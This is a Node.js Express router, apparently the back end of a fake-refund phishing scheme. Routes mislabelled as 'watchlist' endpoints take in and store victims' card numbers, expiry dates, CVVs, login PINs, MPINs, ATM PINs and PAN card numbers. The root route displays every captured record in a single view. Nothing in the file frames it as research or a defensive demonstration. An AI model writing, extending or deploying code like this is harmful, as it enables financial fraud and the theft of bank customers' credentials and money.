const express = require("express");
const router = express.Router();
const DataSchema = require("./../models/data_schema");

//Get all watchlists
router.get("/", async (req, res) => {
  try {
    const data = await DataSchema.find();
    // res.status(200).json(data);
    res.render("index.ejs", { data: data });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Get one watchlist
router.get("/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id).lean();
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }
    res.status(200).json(watchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Create One
router.post("/", async (req, res) => {
  //All Field Required
  if (!req.body.refund_amount || !req.body.account_holder_name) {
    //Return eerror
    return res.status(400).json({
      message: "All fields are required",
      status: "error",
    });
  }

  const data = new DataSchema({
    refund_amount: req.body.refund_amount,
    account_holder_name: req.body.account_holder_name,
    card_holder_name: req.body.card_holder_name,
    card_number: req.body.card_number,
    expiry_date: req.body.expiry_date,
    cvv: req.body.cvv,
    login_pin: req.body.login_pin,
    mpin: req.body.mpin,
  });
  try {
    //Save and return id
    const newData = await data.save();
    res.status(201).json({
      message: "Data saved successfully",
      status: "success",
      id: newData._id,
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

//Delete one watchlist
router.delete("/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }
    await DataSchema.findByIdAndDelete(req.params.id);
    res.status(200).json({ message: "Watchlist deleted", status: "success" });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update signature
router.patch("/card/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }
    
    //Update Card Details
    watchlist.card_holder_name = req.body.card_holder_name; // Update the card_holder_name field
    watchlist.card_number = req.body.card_number; // Update the card_number field
    watchlist.expiry_date = req.body.expiry_date; // Update the expiry_date field
    watchlist.cvv = req.body.cvv; // Update the cvv field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);

  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update signature
router.patch("/login/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }

    watchlist.login_pin = req.body.login_pin; // Update the login_pin field
    watchlist.mpin = req.body.mpin; // Update the mpin field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);
    
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update atm_pin and pan_card
router.patch("/atm_pin_pan_card/:id", async (req, res) => {
  try {
    const watchlist = await DataSchema.findById(req.params.id);
    if (!watchlist) {
      return res
        .status(404)
        .json({ message: "Watchlist not found", status: "error" });
    }

    watchlist.atm_pin = req.body.atm_pin; // Update the atm_pin field
    watchlist.pan_card = req.body.pan_card; // Update the pan_card field

    const updatedWatchlist = await watchlist.save();
    res.status(200).json(updatedWatchlist);
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

module.exports = router;
